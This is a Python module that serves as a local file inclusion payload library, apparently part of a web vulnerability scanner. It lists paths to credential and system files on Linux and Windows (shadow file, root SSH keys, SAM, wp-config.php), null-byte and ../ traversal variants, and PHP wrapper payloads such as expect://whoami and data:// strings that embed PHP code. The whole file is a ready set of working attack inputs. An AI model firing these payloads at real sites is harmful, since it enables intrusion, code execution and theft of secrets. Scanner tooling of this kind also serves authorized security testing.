"""
LFI payload library — P2 upgrade: 100+ payloads, Linux + Windows + PHP wrappers.
"""
from typing import List, Dict

LFI_PAYLOADS_LINUX: List[str] = [
    "/etc/passwd", "/etc/hosts", "/etc/issue", "/etc/motd", "/etc/group",
    "/etc/shadow", "/etc/fstab", "/etc/crontab", "/etc/resolv.conf",
    "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status",
    "/proc/self/fd/0", "/proc/self/fd/1", "/proc/self/maps",
    "/proc/version", "/proc/cpuinfo", "/proc/meminfo",
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
    "/var/log/mail.log", "/var/log/vsftpd.log",
    "/var/www/html/config.php", "/var/www/html/wp-config.php",
    "/var/www/config.php", "/var/www/html/.htaccess",
    "/home/admin/.ssh/id_rsa", "/root/.ssh/id_rsa",
    "/root/.bash_history", "/home/admin/.bash_history",
    "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
    "/etc/mysql/my.cnf", "/etc/php/7.4/apache2/php.ini",
    "/etc/php/8.1/apache2/php.ini",
]

LFI_PAYLOADS_WINDOWS: List[str] = [
    "C:\\Windows\\win.ini", "C:\\Windows\\system.ini",
    "C:\\boot.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\xampp\\htdocs\\config.php", "C:\\xampp\\passwords.txt",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\Windows\\repair\\SAM", "C:\\Windows\\repair\\SYSTEM",
    "C:\\Program Files\\MySQL\\my.ini",
    "C:\\xampp\\apache\\conf\\httpd.conf",
]

NULL_BYTE_PAYLOADS: List[str] = [
    "/etc/passwd%00",
    "/etc/passwd%00.html",
    "/etc/passwd%00.php",
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.html",
    "....//....//....//etc/passwd%00",
]

PHP_WRAPPER_PAYLOADS: List[str] = [
    # php:// wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/string.rot13/resource=index.php",
    # php://input (needs POST body)
    "php://input",
    # data://
    "data://text/plain,<?php phpinfo()?>",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=",
    # expect://
    "expect://whoami",
    "expect://id",
    # file://
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    # zip://
    "zip://backup.zip%23shell.php",
    # Phar
    "phar://uploaded_file.zip/shell.php",
    # compress.zlib
    "compress.zlib://file:///etc/passwd",
    "compress.bzip2://file:///etc/passwd",
]


def build_path_traversal_payloads(depth: int = 8) -> List[str]:
    """Generate ../ sequences at increasing depths."""
    payloads = []
    targets = [
        "etc/passwd", "etc/hosts", "etc/issue",
        "proc/self/environ", "proc/self/cmdline",
        "var/log/apache2/access.log",
        "Windows/win.ini", "Windows/System32/drivers/etc/hosts",
    ]
    for d in range(1, depth + 1):
        prefix = "../" * d
        for target in targets[:4]:
            payloads.append(prefix + target)
    return payloads


def build_lfi_payloads(depth: int = 8) -> List[str]:
    """Full LFI payload set: direct paths + traversal + wrappers + null byte."""
    payloads = list(LFI_PAYLOADS_LINUX)
    payloads.extend(build_path_traversal_payloads(depth))
    payloads.extend(PHP_WRAPPER_PAYLOADS)
    payloads.extend(NULL_BYTE_PAYLOADS)
    return payloads
